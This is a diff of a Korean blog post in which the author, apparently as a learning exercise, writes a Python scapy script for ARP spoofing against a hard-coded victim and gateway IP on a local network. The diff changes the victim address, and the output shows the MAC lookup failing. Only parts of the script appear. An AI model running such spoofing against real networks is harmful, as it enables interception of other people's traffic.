@@ -21,8 +21,7 @@ read_time: false
 ### 스푸핑을 구현해보자
 ---
 
-실험이 잘 안되었다. 다음에 리눅스를 활용하여 실험까지도 해보자
-{: .notice}
+
 
 ```python
 from scapy.all import *
@@ -50,7 +49,7 @@ def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
 
 def main():
     gatewayip='192.168.0.1'
-    victimip ='192.168.0.65'
+    victimip ='192.168.0.234'
     
     victimmac=getMAC(victimip) #맥주소를 얻어온다.
     gatewaymac=getMAC(gatewayip)
@@ -73,6 +72,10 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+실험이 잘 안되었다. 다음에 리눅스를 활용하여 실험까지도 해보자
+{: .notice}
+
 ```
 Begin emission:
 .............Begin emission:
@@ -88,3 +91,4 @@ Begin emission:
 Received 24 packets, got 0 answers, remaining 1 packets
 MAC주소를 찾을 수 없습니다
 ```
+
